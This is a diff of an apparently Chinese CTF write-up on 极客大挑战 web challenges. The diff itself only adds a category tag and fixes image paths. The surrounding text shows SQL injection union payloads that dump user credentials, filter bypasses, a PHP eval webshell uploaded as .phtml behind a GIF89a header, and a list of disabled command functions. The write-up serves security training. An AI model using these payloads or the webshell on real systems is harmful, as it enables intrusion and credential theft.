@@ -5,6 +5,8 @@ tags:
 - ctf
 - 极客大挑战
 - web
+categories: 
+ - 刷题记录
 ---
 
 ## 极客大挑战web
@@ -19,29 +21,29 @@ fuzz了一下发现过滤了空格，单引号报错。如果查询数据为空�
 
 1. #### order by判断字段，字段为3
 
-![](/pic/38.png)
+![](../pic/38.png)
 
 `?username='union+select+1,group_concat(username,',',password),3+from+l0ve1ysq1+limit+0,1+%23&password=123 `
 
-![](/pic/39.png)
+![](../pic/39.png)
 
 2. #### union确定回显，回显位置为2，3
 
 `?username='union+select+1,2,3+%23&password=123`
 
-![](/pic/40.png)
+![](../pic/40.png)
 
 3. #### 查数据库
 
 `?username='union+select+1,database(),3+%23&password=123`
 
-![](/pic/41.png)
+![](../pic/41.png)
 
 4. #### 查表
 
 `?username='union+select+1,group_concat(table_name),3+from+information_schema.tables+where+table_schema='geek'+%23&password=123`
 
-![](/pic/42.png)
+![](../pic/42.png)
 
 l0ve1ysq1、geekuser
 
@@ -49,11 +51,11 @@ l0ve1ysq1、geekuser
 
 `?username='union+select+1,group_concat(column_name),3+from+information_schema.columns+where+table_schema='geek'+and+table_name='l0ve1ysq1'+%23&password=123`
 
-![](/pic/43.png)
+![](../pic/43.png)
 
 `?username='union+select+1,group_concat(column_name),3+from+information_schema.columns+where+table_schema='geek'+and+table_name='geekuser'+%23&password=123`
 
-![](/pic/44.png)
+![](../pic/44.png)
 
 6. #### 查数据
 
@@ -61,13 +63,13 @@ l0ve1ysq1、geekuser
 
 geekuser只有一个admin
 
-![](/pic/45.png)
+![](../pic/45.png)
 
 l0ve1ysq1表中发现了flag
 
 `?username='union+select+1,group_concat(username,',',password),3+from+l0ve1ysq1+limit+0,1+%23&password=123` 
 
-![](/pic/46.png)
+![](../pic/46.png)
 
 
 
@@ -103,7 +105,7 @@ b4bsql,geekuser
 
 `?username='uniunionon+selselectect+1,group_concat(username,passwoorrd),3+frfromom+b4bsql--+&password=123`
 
-![](/pic/47.png)
+![](../pic/47.png)
 
 成功拿到flag
 
@@ -111,7 +113,7 @@ b4bsql,geekuser
 
 打开BP，开启拦截，查看site map发现有一个secret.php
 
-![](/pic/48.png)
+![](../pic/48.png)
 
 访问即可
 
@@ -164,7 +166,7 @@ if (isset($_POST['password'])) {
 
 在数字之后面加一个字符就变成了字符串类型，即可绕过。最后面的是弱类型的判断，加了字符之后还是符合的
 
-![](/pic/49.png)
+![](../pic/49.png)
 
 抓包发现有cookie, user=0，改成=1，变成了
 
@@ -183,27 +185,27 @@ Please input your password!!
 
 上传PHP一句话被过滤
 
-![](/pic/50.png)
+![](../pic/50.png)
 
 换成图片后缀jpg进行%00截断，还是被过滤
 
-![](/pic/51.png)
+![](../pic/51.png)
 
 尝试php2,php3,php5都被过滤
 
-![](/pic/52.png)
+![](../pic/52.png)
 
-![](/pic/53.png)
+![](../pic/53.png)
 
-![](/pic/54.png)
+![](../pic/54.png)
 
 只有phtml没有被过滤
 
-![](/pic/55.png)
+![](../pic/55.png)
 
 内容不能出现`<?`可以换成js的写法
 
-![](/pic/56.png)
+![](../pic/56.png)
 
 ```
 <script language="php">
@@ -213,11 +215,11 @@ eval($_POST['cmd']);
 
 再上传提示必须是图片，添加gif文件头`GIF89a`
 
-![](/pic/57.png)
+![](../pic/57.png)
 
 使用蚁剑，菜刀连接，找到flag
 
-![](/pic/58.png)
+![](../pic/58.png)
 
 ### HardSQL
 
@@ -253,13 +255,13 @@ fuzz测试
 
 fuzz之后发现被过滤的关键字有
 
-![](/pic/59.png)
+![](../pic/59.png)
 
 题目提示有盲注，还给了一个含有ID的界面。注入点再id处，不再是之前的输入框
 
-![](/pic/60.png)
+![](../pic/60.png)
 
-![](/pic/61.png)
+![](../pic/61.png)
 
 根据括号内的数字不同，返回的界面不同，和没被过滤的关键字可以使用盲注
 
@@ -389,15 +391,15 @@ PHP 7 assert ( [mixed](https://www.php.net/manual/zh/language.pseudo-types.php#l
 
 如果 `assertion` 是字符串，它将会被 **assert()** 当做 PHP 代码来执行。 `assertion` 是字符串的优势是当禁用断言时它的开销会更小，并且在断言失败时消息会包含 `assertion` 表达式。 这意味着如果你传入了 boolean 的条件作为 `assertion`，这个条件将不会显示为断言函数的参数；在调用你定义的 [assert_options()](https://www.php.net/manual/zh/function.assert-options.php) 处理函数时，条件会转换为字符串，而布尔值 **`FALSE`** 会被转换成空字符串。
 
-![](/pic/64.png)
+![](../pic/64.png)
 
 先查看phpinfo()
 
-![](/pic/62.png)
+![](../pic/62.png)
 
 禁用了很多执行系统命令的函数
 
-![](/pic/63.png)
+![](../pic/63.png)
 
 ```
 pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl
